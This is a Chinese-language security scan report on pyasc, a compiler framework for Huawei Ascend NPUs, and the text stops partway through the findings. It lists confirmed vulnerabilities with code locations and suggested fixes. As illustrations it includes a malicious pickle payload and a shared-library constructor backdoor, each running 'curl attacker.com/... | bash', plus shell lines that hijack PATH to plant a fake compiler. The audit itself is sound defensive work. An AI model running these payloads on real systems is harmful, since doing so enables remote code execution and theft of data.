# 漏洞扫描报告 — 已确认漏洞

**项目**: pyasc
**扫描时间**: 2026-04-22T10:30:00Z
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

pyasc 是华为昇腾 NPU 的 JIT 编译器框架，开发者使用 `@asc.jit` 装饰器编写自定义算子，框架将 Python DSL 编译为 Ascend C 代码并在 NPU 上执行。本次安全扫描发现了 **19 个已确认漏洞**，其中 **13 个 Critical 级别**，**6 个 High 级别**，无 Medium/Low 级别已确认漏洞。

**核心风险评估**: 本次扫描揭示了两个严重的攻击向量，均可导致**任意代码执行 (RCE)**：

1. **环境变量劫持链** (CWE-78/CWE-427/CWE-426): PYASC_COMPILER、PYASC_LINKER、PYASC_CACHE_DIR、ASCEND_HOME_PATH 等环境变量完全控制编译器路径、缓存目录和动态库加载路径。在多用户共享服务器环境中，恶意用户可设置环境变量劫持编译流程，植入后门程序或窃取其他用户数据。

2. **代码注入链** (CWE-94): VerbatimOp 和 CallOpaqueOp 等操作允许用户提供的字符串直接嵌入生成的 C++ 代码中，无任何验证。恶意 MLIR 文件或 Python DSL 可注入任意代码到编译生成的算子中。

**业务影响**: 
- **本地权限提升**: 环境变量攻击链可在共享 AI 服务器上实现跨用户攻击
- **供应链攻击**: 恶意编译器可植入持久化后门，影响所有使用 pyasc 的算子
- **数据泄露**: 恶意运行时库可窃取 NPU 内存中的敏感模型参数和训练数据

**优先修复方向**:
- 立即对环境变量控制的路径实施白名单验证和签名校验
- 对 VerbatimOp/CallOpaqueOp 实施代码内容安全检查
- 使用安全的序列化格式替代 pickle，并实施缓存完整性校验

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| LIKELY | 33 | 40.7% |
| POSSIBLE | 29 | 35.8% |
| CONFIRMED | 19 | 23.5% |
| **总计** | **81** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 13 | 68.4% |
| High | 6 | 31.6% |
| **有效漏洞总计** | **19** | - |
| 误报 (FALSE_POSITIVE) | 0 | - |

### 1.3 Top 10 关键漏洞

1. **[VULN-CROSS-001]** environment_variable_chain (Critical) - ? @ `?` | 置信度: 90
2. **[VULN-SEC-RUN-001]** deserialization (Critical) - `python/asc/runtime/jit.py:171` @ `_cache_kernel` | 置信度: 85
3. **[VULN-SEC-RUN-002]** command_injection (Critical) - `python/asc/runtime/compiler.py:106` @ `Compiler.__init__` | 置信度: 85
4. **[VULN-lib_runtime-001]** Unsafe Dynamic Library Loading (Critical) - `python/asc/lib/runtime/state.py:50` @ `RuntimeInterface.__init__` | 置信度: 85
5. **[VULN-lib_runtime-006]** Improper Control of Dynamically-Managed Code Resources (Critical) - `python/asc/runtime/cache.py:22` @ `CacheOptions.__init__` | 置信度: 85
6. **[VULN-lib_runtime-002]** Unsafe Dynamic Module Loading (Critical) - `python/asc/lib/runtime/state.py:110` @ `NPUUtils.__init__` | 置信度: 85
7. **[VULN-lib_runtime-003]** Unsafe Dynamic Library Loading (Critical) - `python/asc/lib/runtime/print_utils.py:70` @ `PrintInterface.__init__` | 置信度: 85
8. **[VULN-SEC-RT-001]** untrusted_search_path (Critical) - `python/asc/lib/runtime/state.py:50` @ `RuntimeInterface.__init__` | 置信度: 85
9. **[VULN-SEC-RT-003]** code_injection (Critical) - `python/asc/lib/runtime/state.py:110` @ `NPUUtils.__init__` | 置信度: 85
10. **[VULN-CROSS-002]** code_injection_chain (Critical) - ? @ `?` | 置信度: 85

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `jit@python/asc/__init__.py` | decorator | untrusted_local | 用户通过 @asc.jit 装饰器传入 Python 函数，该函数作为 DSL 代码被编译器处理。攻击者如果能控制用户脚本内容，可影响编译流程。 | JIT 编译装饰器入口，用户 Python DSL 代码从此进入编译流程 |
| `Compiler.__init__@python/asc/runtime/compiler.py` | env | untrusted_local | 环境变量 PYASC_COMPILER 和 PYASC_LINKER 控制外部编译器路径。本地攻击者可设置这些变量指向恶意程序。 | 从环境变量读取编译器和链接器路径 |
| `Compiler.__init__@python/asc/runtime/compiler.py` | env | untrusted_local | 环境变量 PYASC_DUMP_PATH 控制中间文件输出路径。本地攻击者可设置任意路径。 | 从环境变量读取 dump 输出路径 |
| `CacheOptions@python/asc/runtime/cache.py` | env | untrusted_local | 环境变量 PYASC_HOME 和 PYASC_CACHE_DIR 控制缓存目录位置。本地攻击者可指向恶意缓存文件。 | 从环境变量读取缓存目录配置 |
| `_cache_kernel@python/asc/runtime/jit.py` | file | semi_trusted | 从缓存文件加载 pickle 序列化的 CompiledKernel。缓存目录由环境变量控制，可能被本地攻击者篡改。 | pickle 反序列化缓存的 kernel 二进制 |
| `_run_cmd@python/asc/runtime/compiler.py` | rpc | untrusted_local | subprocess.Popen 调用外部编译器。编译器路径由环境变量控制，可能被本地攻击者设置为恶意程序。 | 通过 subprocess 调用外部编译器 |
| `main@bin/ascir-opt.cpp` | cmdline | untrusted_local | CLI 工具接受命令行参数处理 MLIR 文件。本地用户可提供恶意 MLIR 文件。 | ascir-opt CLI 工具入口，处理 MLIR 文件 |
| `main@bin/ascir-translate.cpp` | cmdline | untrusted_local | CLI 工具接受命令行参数处理 MLIR 文件。本地用户可提供恶意 MLIR 文件。 | ascir-translate CLI 工具入口，处理 MLIR 文件 |
| `RuntimeInterface.__init__@python/asc/lib/runtime/state.py` | file | semi_trusted | ctypes.CDLL 加载动态库，库路径来自缓存。缓存机制可能被本地攻击者利用。 | 动态加载编译生成的运行时库 |

**其他攻击面**:
- subprocess 编译器调用: 通过环境变量 PYASC_COMPILER/PYASC_LINKER 可控制外部程序执行
- pickle 反序列化: 缓存文件使用 pickle 存储和加载 CompiledKernel
- 环境变量注入: 多个环境变量控制编译器路径、缓存目录、dump 路径
- MLIR 文件解析: CLI 工具 (ascir-opt, ascir-translate) 处理用户提供的 MLIR 文件
- Python DSL 代码: 用户编写的 @asc.jit 装饰器函数作为输入进入编译流程
- 动态库加载: ctypes.CDLL 加载编译生成的 .so 文件
- 临时文件操作: 编译过程创建临时目录和文件

---

## 3. Critical 漏洞 (13)

### [VULN-CROSS-001] environment_variable_chain - unknown

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `?:?` @ `?`
**模块**: cross_module
**跨模块**: runtime → lib_runtime → lib_host

**描述**: 跨模块环境变量攻击链: PYASC_COMPILER/PYASC_LINKER/PYASC_CACHE_DIR/ASCEND_HOME_PATH/CXX/CC 控制编译器路径和缓存目录，可被本地攻击者劫持导致恶意代码执行。涉及 runtime/compiler.py, runtime/cache.py, jit.py, lib_runtime/build_utils.py, lib_host/loader.py。

**达成路径**

环境变量 → shutil.which() → subprocess.Popen()/check_call() → 恶意编译器执行

**验证说明**: Verified: Cross-module environment variable attack chain confirmed. PYASC_COMPILER/LINKER/CACHE_DIR/ASCEND_HOME_PATH/CXX/CC all control execution paths. Multiple modules affected (runtime, lib_runtime, lib_host).

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 5 | cross_file: 0

**深度分析**

**根因分析**: 框架设计时假设环境变量由可信用户设置，但未考虑多用户共享服务器场景。攻击链起点在 `compiler.py:106` 和 `cache.py:22-23`，环境变量直接传递给 `shutil.which()` 和缓存路径构造，未经任何验证。攻击者可同时控制 PYASC_COMPILER 和 PATH 环境变量，或控制 PYASC_CACHE_DIR 指向恶意缓存目录，从而在多个模块中实现代码执行。

**潜在利用场景**: 在企业 AI 集群中，恶意用户 A 可设置环境变量：
```bash
export PYASC_COMPILER=/tmp/.hidden/malicious_bisheng
export PATH=/tmp/.hidden:$PATH
```
当用户 B 在同一服务器上运行 pyasc 编译算子时，`shutil.which()` 在 PATH 中找到恶意编译器，`subprocess.Popen` 执行该程序。恶意编译器可在编译产物中植入后门代码，窃取用户 B 的模型参数或实现持久化攻击。

**建议修复方式**:
1. 强制 PYASC_COMPILER/PYASC_LINKER 必须为绝对路径，拒绝相对路径和 PATH 搜索
2. 实施白名单机制：仅允许 `/usr/bin/`, `/usr/local/bin/`, `/opt/cann/` 等可信目录
3. 使用 SHA256 或 GPG 签名验证编译器二进制完整性
4. 禁用 PYASC_CACHE_DIR 环境变量，使用固定路径 `~/.pyasc/cache`

---

### [VULN-SEC-RUN-001] deserialization - _cache_kernel

**严重性**: Critical | **CWE**: CWE-502 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `python/asc/runtime/jit.py:171-172` @ `_cache_kernel`
**模块**: runtime

**描述**: Unsafe pickle deserialization of cached kernel objects without integrity verification. The cache directory is controlled by environment variables (PYASC_HOME, PYASC_CACHE_DIR), and pickle.load() is called directly on files from this directory. An attacker who can control the environment variables or write to the cache directory can inject malicious pickle payloads that execute arbitrary code upon deserialization.

**漏洞代码** (`python/asc/runtime/jit.py:171-172`)

```c
with open(dst, 'rb') as file:
    kernel = pickle.load(file)
```

**达成路径**

cache.py:22-23 → os.getenv('PYASC_HOME'/'PYASC_CACHE_DIR') [SOURCE - env var]
→ cache.py:47 → self.cache_dir = cache_options.dir [TAINTED PATH]
→ jit.py:164-167 → get_file_cache_key() → file_cache_manager.get_file() → cached_kernel_file [FILE PATH DERIVED FROM ENV]
→ jit.py:170-172 → open(cached_kernel_file, 'rb') → pickle.load(file) [SINK - deserialization RCE]

**验证说明**: Verified: PYASC_CACHE_DIR env var directly controls cache path, pickle.load() deserializes from attacker-controlled cache directory. No integrity verification. Full attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 从源代码 `jit.py:171-172` 可见，`pickle.load(file)` 直接反序列化缓存文件。缓存文件路径由 `file_cache_manager.get_file()` 返回，其根目录来自 `cache.py:22-23` 的 PYASC_CACHE_DIR 环境变量。Python pickle 反序列化天然不安全——恶意 pickle 对象的 `__reduce__` 方法可在加载时执行任意 Python 代码。

**潜在利用场景**: 
攻击者可通过以下步骤实现 RCE：
1. 设置环境变量 `PYASC_CACHE_DIR=/tmp/malicious_cache`
2. 在该目录预填充恶意 pickle 文件（如 `kernel_name.o`），payload 示例：
   ```python
   import pickle
   class Exploit:
       def __reduce__(self):
           return (os.system, ('curl attacker.com/backdoor.sh | bash',))
   pickle.dump(Exploit(), open('/tmp/malicious_cache/.../kernel.o', 'wb'))
   ```
3. 用户运行 pyasc 时，缓存命中，恶意 pickle 被加载，立即执行攻击代码

**建议修复方式**:
1. **方案 A (推荐)**: 使用 JSON + base64 替代 pickle 存储 CompiledKernel 对象，JSON 反序列化不执行代码
2. **方案 B**: 对缓存文件实施签名验证：
   - 写入时计算 HMAC-SHA256 签名（密钥存储在用户目录 `.pyasc/.secret`）
   - 加载时验证签名，拒绝篡改文件
3. 限制缓存目录必须位于用户 home 目录下（`~/.pyasc/cache`），禁止环境变量覆盖
4. 设置缓存目录权限为 `0700`，防止其他用户写入

---

### [VULN-SEC-RUN-002] command_injection - Compiler.__init__

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `python/asc/runtime/compiler.py:106-113` @ `Compiler.__init__`
**模块**: runtime

**描述**: Environment variable-controlled compiler/linker execution paths. PYASC_COMPILER and PYASC_LINKER environment variables determine which executables are invoked via subprocess.Popen(). shutil.which() searches PATH to locate the executable. An attacker who can set these environment variables (or modify PATH) can cause execution of a malicious compiler/linker binary, resulting in arbitrary code execution.

**漏洞代码** (`python/asc/runtime/compiler.py:106-113`)

```c
compiler = shutil.which(os.environ.get('PYASC_COMPILER', 'bisheng'))
if compiler is None:
    raise RuntimeError('Compiler executable is not found, check PYASC_COMPILER environment variable')
self.compiler = compiler
linker = shutil.which(os.environ.get('PYASC_LINKER', 'ld.lld'))
if linker is None:
    raise RuntimeError('Linker executable is not found, check PYASC_LINKER environment variable')
self.linker = linker
```

**达成路径**

compiler.py:106 → shutil.which(os.environ.get('PYASC_COMPILER', 'bisheng')) [SOURCE - env var + PATH lookup]
→ compiler.py:109 → self.compiler = compiler [TAINTED EXECUTABLE PATH]
→ compiler.py:145-146 → subprocess.Popen(cmd, ...) where cmd[0] = self.compiler [SINK - command execution]
→ compiler.py:110 → shutil.which(os.environ.get('PYASC_LINKER', 'ld.lld')) [SOURCE]
→ compiler.py:113 → self.linker = linker [TAINTED]
→ compiler.py:298-304 → link_cmd includes self.linker → subprocess.Popen() [SINK]

**验证说明**: Verified: PYASC_COMPILER/PYASC_LINKER env vars control executable paths via shutil.which(), subprocess.Popen() executes attacker-controlled compiler/linker. Command injection confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 从源代码 `compiler.py:106-113` 可见：
```python
compiler = shutil.which(os.environ.get('PYASC_COMPILER', 'bisheng'))
linker = shutil.which(os.environ.get('PYASC_LINKER', 'ld.lld'))
```
`shutil.which()` 在 PATH 环境变量中搜索可执行文件。攻击者可同时控制 PYASC_COMPILER 和 PATH，使 `shutil.which()` 返回恶意程序路径。后续在 `_run_cmd()` 中通过 `subprocess.Popen(cmd)` 执行，cmd[0] 即为攻击者控制的编译器/链接器路径。

**潜在利用场景**:
在共享开发服务器上，恶意用户执行：
```bash
export PYASC_COMPILER="bisheng"  # 不指定路径，依赖 which 搜索
export PATH="/tmp/.exploit:$PATH"
# 在 /tmp/.exploit/ 下放置名为 "bisheng" 的恶意脚本
```
当其他开发者运行 pyasc 编译算子时：
- `shutil.which("bisheng")` 找到 `/tmp/.exploit/bisheng`
- `subprocess.Popen(["/tmp/.exploit/bisheng", ...])` 执行恶意程序
- 恶意程序可在编译产物中植入后门，或直接窃取源代码

**建议修复方式**:
1. 要求 PYASC_COMPILER 必须为绝对路径，拒绝 basename（不使用 shutil.which）
2. 白名单验证：路径必须匹配 `/usr/bin/*`, `/usr/local/bin/*`, `/opt/cann/*`
3. 对编译器二进制进行签名验证（华为官方编译器应有 GPG 签名）
4. 如果环境变量未设置，使用硬编码的固定路径而非 PATH 搜索

---

### [VULN-lib_runtime-001] Unsafe Dynamic Library Loading - RuntimeInterface.__init__

**严重性**: Critical（原评估: CRITICAL → 验证后: Critical） | **CWE**: CWE-427 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `python/asc/lib/runtime/state.py:50` @ `RuntimeInterface.__init__`
**模块**: lib_runtime
**跨模块**: runtime/cache.py, lib_runtime/state.py

**描述**: Uncontrolled search path element leads to arbitrary code execution. The ctypes.CDLL() loads a shared library from a cache path that is controlled by environment variables (PYASC_HOME, PYASC_CACHE_DIR). An attacker who can set these environment variables can place a malicious library in the cache directory, which will be loaded and executed with the privileges of the Python process.

**漏洞代码** (`python/asc/lib/runtime/state.py:50`)

```c
self.lib: ctypes.CDLL = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)
```

**达成路径**

PYASC_HOME/PYASC_CACHE_DIR env vars → CacheOptions.dir → FileCacheManager.cache_dir → cache_manager.get_file() → rt_lib → ctypes.CDLL(rt_lib)

**验证说明**: Verified: ctypes.CDLL from env-controlled cache. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 从源代码 `state.py:50` 可见：
```python
self.lib: ctypes.CDLL = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)
```
`rt_lib` 路径来自 `cache_manager.get_file()`，缓存目录由 PYASC_CACHE_DIR 控制。ctypes.CDLL 加载共享库时，库的 `.init_array` 和 `.preinit_array` 段中的代码会在加载时自动执行（构造函数机制）。攻击者只需放置恶意 .so 文件，无需主动调用任何函数即可触发代码执行。

**潜在利用场景**:
攻击者在恶意缓存目录放置预编译的恶意共享库：
```c
// malicious.c
__attribute__((constructor)) void backdoor() {
    system("curl attacker.com/shell.sh | bash");
}
// 编译为 librt_wrapper.so
```
设置 `PYASC_CACHE_DIR=/tmp/malicious` 并预填充恶意 .so。当 RuntimeInterface 初始化时：
- `cache_manager.get_file("librt_wrapper.so")` 返回恶意路径
- `ctypes.CDLL(rt_lib)` 加载恶意库
- 构造函数 `backdoor()` 立即执行，实现 RCE

**建议修复方式**:
1. 对加载的 .so 文件进行签名验证（写入时存储签名，加载时校验）
2. 使用 `ctypes.RTLD_NOW` 标志强制立即绑定符号，而非 `RTLD_LAZY`（减少延迟执行风险）
3. 限制缓存目录必须在固定安全路径（`~/.pyasc/cache`），禁止环境变量控制
4. 验证加载的库文件名必须匹配预期模式（如 `lib*_wrapper.so`）

---

### [VULN-lib_runtime-006] Improper Control of Dynamically-Managed Code Resources - CacheOptions.__init__

**严重性**: Critical（原评估: HIGH → 验证后: Critical） | **CWE**: CWE-913 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `python/asc/runtime/cache.py:22-23` @ `CacheOptions.__init__`
**模块**: lib_runtime
**跨模块**: runtime/cache.py, lib_runtime/state.py, lib_runtime/print_utils.py

**描述**: Cache pollution leading to arbitrary code execution. The cache directory location is entirely controlled by environment variables (PYASC_HOME, PYASC_CACHE_DIR) without integrity verification. An attacker who can set these variables can pre-populate the cache with malicious shared libraries that will be loaded during runtime.

**漏洞代码** (`python/asc/runtime/cache.py:22-23`)

```c
home_dir: str = os.getenv("PYASC_HOME", os.path.expanduser("~/"))\ndir: str = os.getenv("PYASC_CACHE_DIR", os.path.join(home_dir, ".pyasc", "cache"))
```

**达成路径**

PYASC_HOME/PYASC_CACHE_DIR env vars → CacheOptions.dir → FileCacheManager.cache_dir → get_file() returns attacker-controlled path

**验证说明**: Verified: Cache pollution via env vars. Enables arbitrary code execution. Severity upgraded.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 从源代码 `cache.py:22-23` 可见：
```python
home_dir: str = os.getenv("PYASC_HOME", os.path.expanduser("~/"))
dir: str = os.getenv("PYASC_CACHE_DIR", os.path.join(home_dir, ".pyasc", "cache"))
```
CacheOptions 使用 frozen=True 的 dataclass，但 `cache_options = CacheOptions()` 在模块加载时立即实例化，使用当时的环境变量值。攻击者可在 Python 进程启动前设置环境变量，使缓存目录指向攻击者控制的路径。这是所有缓存相关漏洞的**核心源头**——缓存污染、pickle RCE、恶意动态库加载均依赖此环境变量。

**潜在利用场景**:
攻击者预先准备恶意缓存目录，包含：
- 恶意 pickle 文件（针对 jit.py 反序列化）
- 恶意 .so 文件（针对 state.py ctypes.CDLL）
- 恶意 Python 模块（针对 NPUUtils importlib 加载）

设置环境变量后，所有使用 pyasc 的用户都会加载这些恶意文件。攻击者可实现：
1. 即时 RCE（pickle 反序列化或 .so 构造函数）
2. 持久化后门（植入到编译生成的算子中）
3. 数据窃取（窃取 NPU 内存中的模型参数）

**建议修复方式**:
1. **完全禁用 PYASC_CACHE_DIR 环境变量**，使用硬编码路径 `~/.pyasc/cache`
2. 如果必须支持环境变量，验证路径必须：
   - 位于用户 home 目录下（使用 `os.path.realpath` 防止符号链接绕过）
   - 不包含路径遍历字符（`..`）
   - 目录权限必须为 `0700`
3. 对缓存文件实施完整性校验：
   - 写入时：计算文件哈希，存储在 `.pyasc/index.json`
   - 加载时：验证哈希匹配，拒绝篡改文件
4. 考虑使用系统级缓存（`/var/cache/pyasc/<uid>/`）而非用户可写的目录

---

### [VULN-lib_runtime-002] Unsafe Dynamic Module Loading - NPUUtils.__init__

**严重性**: Critical（原评估: CRITICAL → 验证后: Critical） | **CWE**: CWE-427 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `python/asc/lib/runtime/state.py:110-114` @ `NPUUtils.__init__`
**模块**: lib_runtime
**跨模块**: runtime/cache.py, lib_runtime/state.py

**描述**: Arbitrary code execution via importlib.util.spec_from_file_location(). The utils_lib path is retrieved from an environment-controlled cache and loaded as a Python module without integrity verification. An attacker can place a malicious .so file in the cache to achieve arbitrary code execution.

**漏洞代码** (`python/asc/lib/runtime/state.py:110-114`)

```c
spec = importlib.util.spec_from_file_location(utils_name, utils_lib)\nmod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)
```

**达成路径**

PYASC_HOME/PYASC_CACHE_DIR env vars → cache_manager.get_file() → utils_lib → importlib.util.spec_from_file_location() → exec_module()

**验证说明**: Verified: importlib module loading from cache. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-lib_runtime-003] Unsafe Dynamic Library Loading - PrintInterface.__init__

**严重性**: Critical（原评估: CRITICAL → 验证后: Critical） | **CWE**: CWE-427 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `python/asc/lib/runtime/print_utils.py:70` @ `PrintInterface.__init__`
**模块**: lib_runtime
**跨模块**: runtime/cache.py, lib_runtime/print_utils.py

**描述**: Uncontrolled search path element in PrintInterface.__init__. Similar to RuntimeInterface, this loads a shared library from an environment-controlled cache using ctypes.cdll.LoadLibrary(). An attacker can exploit the same cache pollution vector.

**漏洞代码** (`python/asc/lib/runtime/print_utils.py:70`)

```c
self.lib: ctypes.CDLL = ctypes.cdll.LoadLibrary(rt_lib)
```

**达成路径**

PYASC_HOME/PYASC_CACHE_DIR env vars → cache_manager.get_file() → rt_lib → ctypes.cdll.LoadLibrary(rt_lib)

**验证说明**: Verified: PrintInterface ctypes.CDLL from cache. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-RT-001] untrusted_search_path - RuntimeInterface.__init__

**严重性**: Critical | **CWE**: CWE-426 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `python/asc/lib/runtime/state.py:50` @ `RuntimeInterface.__init__`
**模块**: lib_runtime
**跨模块**: lib_runtime → runtime.cache

**描述**: Dynamic library loading from untrusted cache path without validation. ctypes.CDLL loads .so files from a cache directory controlled by PYASC_CACHE_DIR environment variable. No signature verification or integrity check is performed before loading, allowing an attacker to inject malicious shared libraries if they can manipulate the cache directory.

**漏洞代码** (`python/asc/lib/runtime/state.py:50`)

```c
self.lib: ctypes.CDLL = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)
```

**达成路径**

cache.py:22-23 [SOURCE] PYASC_CACHE_DIR env var → ~/.pyasc/cache
state.py:37 cache_manager.get_file() → rt_lib path
state.py:50 ctypes.CDLL(rt_lib) [SINK] loads untrusted .so

**验证说明**: Verified: ctypes.CDLL loads shared library from cache path controlled by PYASC_CACHE_DIR. No signature verification. Attacker can place malicious .so file. Full attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-RT-003] code_injection - NPUUtils.__init__

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `python/asc/lib/runtime/state.py:110-114` @ `NPUUtils.__init__`
**模块**: lib_runtime

**描述**: Unverified module loading via importlib from cached path. NPUUtils loads Python modules from cache using importlib.util.spec_from_file_location without any integrity verification. The loaded module executes with full Python privileges, enabling arbitrary code execution if cache is compromised.

**漏洞代码** (`python/asc/lib/runtime/state.py:110-114`)

```c
import importlib.util
spec = importlib.util.spec_from_file_location(utils_name, utils_lib)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
```

**达成路径**

state.py:99 cache_manager.get_file() → utils_lib path
state.py:111-114 importlib loads module from path [SINK] untrusted code execution

**验证说明**: Verified: importlib.util.spec_from_file_location() loads Python module from cache. exec_module() executes arbitrary code. Cache path controlled by env vars. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-CROSS-002] code_injection_chain - unknown

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `?:?` @ `?`
**模块**: cross_module
**跨模块**: language → pybind_bindings → emitasc_dialect → include_headers → ascendc_target → cli_tools

**描述**: VerbatimOp 跨模块代码注入链: Python DSL (asc.inline) 或 CLI 工具 (ascir-translate) 处理 MLIR 文件中的 VerbatimOp，代码字符串直接输出到生成的 Ascend C 代码中，无任何验证。涉及 language/core/ops.py, pybind_bindings/OpBuilder.cpp, emitasc_dialect, ascendc_target/EmitAsc.cpp。

**达成路径**

Python DSL/MLIR → VerbatimOp → emitter.ostream() << code → 生成的 C++ 代码

**验证说明**: Verified: VerbatimOp cross-module code injection chain. Python DSL/MLIR → VerbatimOp → emitter.ostream() << code → generated C++ code. No validation at any stage. Full chain confirmed.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-CROSS-004] cache_integrity - unknown

**严重性**: Critical（原评估: High → 验证后: Critical） | **CWE**: CWE-502 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `?:?` @ `?`
**模块**: cross_module
**跨模块**: runtime → lib_runtime

**描述**: 跨模块缓存完整性链: pickle 反序列化缓存文件和 ctypes.CDLL 加载 .so 文件均无完整性验证。若缓存目录被篡改 (通过环境变量或文件权限问题)，可注入恶意 payload。涉及 runtime/jit.py, runtime/cache.py, lib_runtime/state.py。

**达成路径**

缓存目录 (PYASC_CACHE_DIR) → pickle.load()/ctypes.CDLL() → 恶意代码执行

**验证说明**: Verified: Cache integrity attack chain. pickle.load() + ctypes.CDLL() both load from PYASC_CACHE_DIR without verification. Combined attack surface confirmed. Severity upgraded to Critical.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-INC-001] code_injection - EmitAsc_VerbatimOp

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `include/ascir/Dialect/EmitAsc/IR/Ops.td:167-170` @ `EmitAsc_VerbatimOp`
**模块**: include_headers
**跨模块**: cli_tools → include_headers → ascendc_target

**描述**: VerbatimOp 定义允许任意字符串作为代码直接输出。如果 MLIR 输入中的 VerbatimOp.value 字段被攻击者控制，可注入任意 C++ 代码到生成的 Ascend C 输出中。

**漏洞代码** (`include/ascir/Dialect/EmitAsc/IR/Ops.td:167-170`)

```c
def EmitAsc_VerbatimOp : EmitAsc_Op<"verbatim"> {
  let arguments = (ins StrAttr:$value, Variadic<AnyType>:$args);
  let assemblyFormat = "$value ($args^ `:` type($args))?  attr-dict";
}
```

**达成路径**

[CREDENTIAL_FLOW] MLIR File Input (cli_tools) → VerbatimOp.value (StrAttr) → CodeEmitter → Generated C++ Code

**验证说明**: Verified: VerbatimOp definition allows arbitrary code output. MLIR input → VerbatimOp.value → generated C++ code. Requires CLI tool or Python DSL input. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-INC-002] code_injection - EmitAsc_CallOpaqueOp

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `include/ascir/Dialect/EmitAsc/IR/Ops.td:27-39` @ `EmitAsc_CallOpaqueOp`
**模块**: include_headers
**跨模块**: cli_tools → include_headers → ascendc_target

**描述**: CallOpaqueOp 定义允许通过函数名调用任意 C++ 函数。如果 MLIR 输入中的 callee 字段被攻击者控制，可调用任意函数，包括危险的系统调用。

**漏洞代码** (`include/ascir/Dialect/EmitAsc/IR/Ops.td:27-39`)

```c
def EmitAsc_CallOpaqueOp : EmitAsc_Op<"call_opaque"> {
  let arguments = (ins StrAttr:$callee, Variadic<AnyType>:$callee_operands);
  let results = (outs Optional<AnyType>:$result);
}
```

**达成路径**

[CREDENTIAL_FLOW] MLIR File Input (cli_tools) → CallOpaqueOp.callee (StrAttr) → CodeEmitter → Arbitrary Function Call

**验证说明**: Verified: CallOpaqueOp allows arbitrary function call via callee string. MLIR input → CallOpaqueOp.callee → C++ function call. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

## 4. High 漏洞 (6)

### [VULN-SEC-PYBIND-001] code_injection - bind_create_emitc_operations

**严重性**: High | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `python/src/OpBuilder.cpp:765-766` @ `bind_create_emitc_operations`
**模块**: pybind_bindings
**跨模块**: pybind_bindings → codegen

**描述**: VerbatimOp 绑定直接将用户提供的字符串插入到生成的代码中，无任何验证或过滤。恶意用户可通过 Python API 注入任意 C++ 代码片段。

**漏洞代码** (`python/src/OpBuilder.cpp:765-766`)

```c
.def("create_emitc_VerbatimOp",
     [](PyOpBuilder &self, const std::string &str) { self.create<emitc::VerbatimOp>(StringRef(str)); })
```

**达成路径**

[CREDENTIAL_FLOW] Python 用户输入 → pybind11 绑定参数 str → emitc::VerbatimOp → CodeGen 模块生成 C++ 代码

**验证说明**: Verified: pybind binding passes user string to VerbatimOp. Code injection confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: -5 | context: 0 | cross_file: 0

---

### [VULN-SEC-PYBIND-002] code_injection - bind_create_emitasc_operations

**严重性**: High | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `python/src/OpBuilder.cpp:791-794` @ `bind_create_emitasc_operations`
